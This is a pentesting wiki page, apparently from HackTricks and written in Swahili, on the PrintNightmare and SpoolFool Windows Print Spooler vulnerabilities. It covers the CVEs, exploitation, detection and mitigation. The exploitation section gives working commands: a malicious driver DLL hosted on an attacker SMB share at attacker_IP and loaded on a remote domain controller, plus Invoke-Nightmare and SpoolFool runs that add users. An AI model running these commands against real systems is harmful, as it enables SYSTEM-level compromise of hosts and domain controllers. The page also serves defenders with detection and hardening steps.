# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare ni jina la pamoja lililotolewa kwa familia ya udhaifu katika huduma ya Windows **Print Spooler** inayoruhusu **utendaji wa msimbo wa kiholela kama SYSTEM** na, wakati spooler inapatikana kupitia RPC, **utendaji wa msimbo wa mbali (RCE) kwenye waudhibiti wa kikoa na seva za faili**. CVEs zinazotumiwa zaidi ni **CVE-2021-1675** (iliyokuwa na daraja la LPE mwanzoni) na **CVE-2021-34527** (RCE kamili). Masuala mengine kama **CVE-2021-34481 (“Point & Print”)** na **CVE-2022-21999 (“SpoolFool”)** yanaonyesha kwamba uso wa shambulio bado haujafungwa.

---

## 1. Vipengele vilivyo hatarini & CVEs

| Mwaka | CVE | Jina fupi | Primitive | Maelezo |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|Imerekebishwa mwezi Juni 2021 CU lakini ilipita na CVE-2021-34527|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|AddPrinterDriverEx inaruhusu watumiaji walioidhinishwa kupakia DLL ya dereva kutoka sehemu ya mbali|
|2021|CVE-2021-34481|“Point & Print”|LPE|Usakinishaji wa dereva usio na saini na watumiaji wasiokuwa wasimamizi|
|2022|CVE-2022-21999|“SpoolFool”|LPE|Uundaji wa saraka ya kiholela → kupanda DLL – inafanya kazi baada ya maboresho ya 2021|

Zote zinatumia moja ya **mbinu za MS-RPRN / MS-PAR RPC** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) au uhusiano wa kuaminiana ndani ya **Point & Print**.

## 2. Mbinu za unyakuzi

### 2.1 Kuathiriwa kwa Waudhibiti wa Kikoa wa Mbali (CVE-2021-34527)

Mtumiaji wa kikoa aliyeidhinishwa lakini **asiye na mamlaka** anaweza kuendesha DLL za kiholela kama **NT AUTHORITY\SYSTEM** kwenye spooler ya mbali (mara nyingi DC) kwa:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popular PoCs ni pamoja na **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) na moduli za Benjamin Delpy `misc::printnightmare / lsa::addsid` katika **mimikatz**.

### 2.2 Kuinua mamlaka ya ndani (Windows yoyote inayoungwa mkono, 2021-2024)

API hiyo hiyo inaweza kuitwa **katika** ili kupakia dereva kutoka `C:\Windows\System32\spool\drivers\x64\3\` na kupata mamlaka ya SYSTEM:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 SpoolFool (CVE-2022-21999) – kupita marekebisho ya 2021

Marekebisho ya Microsoft ya 2021 yalizuia upakiaji wa madereva wa mbali lakini **hayakuimarisha ruhusa za directory**. SpoolFool inatumia parameter ya `SpoolDirectory` kuunda directory isiyo na mipaka chini ya `C:\Windows\System32\spool\drivers\`, inashusha DLL ya payload, na inalazimisha spooler kuipakia:
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Utekelezaji unafanya kazi kwenye Windows 7 → Windows 11 na Server 2012R2 → 2022 zilizopatikana kabla ya sasisho za Februari 2022

---

## 3. Ugunduzi & uwindaji

* **Event Logs** – wezesha *Microsoft-Windows-PrintService/Operational* na *Admin* channels na angalia kwa **Event ID 808** “Spooler ya uchapishaji ilishindwa kupakia moduli ya plug-in” au kwa ujumbe wa **RpcAddPrinterDriverEx**.
* **Sysmon** – `Event ID 7` (Picha imepakiwa) au `11/23` (Kuandika/kufuta faili) ndani ya `C:\Windows\System32\spool\drivers\*` wakati mchakato mzazi ni **spoolsv.exe**.
* **Mfuatano wa mchakato** – arifu kila wakati **spoolsv.exe** inapozalisha `cmd.exe`, `rundll32.exe`, PowerShell au binary isiyo na saini.

## 4. Kupunguza & kuimarisha

1. **Sasisha!** – Tekeleza sasisho la hivi karibuni la jumla kwenye kila mwenyeji wa Windows ambaye ana huduma ya Print Spooler iliyosakinishwa.
2. **Zima spooler mahali ambapo haitahitajika**, hasa kwenye Watawala wa Kikoa:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Zuia muunganisho wa mbali** wakati bado unaruhusu uchapishaji wa ndani – Sera ya Kundi: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Punguza Point & Print** ili tu wasimamizi waweze kuongeza madereva kwa kuweka thamani ya rejista:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Mwongozo wa kina katika Microsoft KB5005652

---

## 5. Utafiti / zana zinazohusiana

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* SpoolFool exploit & andiko
* 0patch micropatches kwa SpoolFool na makosa mengine ya spooler

---

**Kusoma zaidi (nje):** Angalia chapisho la blogu la mwongozo wa 2024 – [Understanding PrintNightmare Vulnerability](https://www.hackingarticles.in/understanding-printnightmare-vulnerability/)

## Marejeo

* Microsoft – *KB5005652: Manage new Point & Print default driver installation behavior*
<https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872>
* Oliver Lyak – *SpoolFool: CVE-2022-21999*
<https://github.com/ly4k/SpoolFool>
{{#include ../../banners/hacktricks-training.md}}
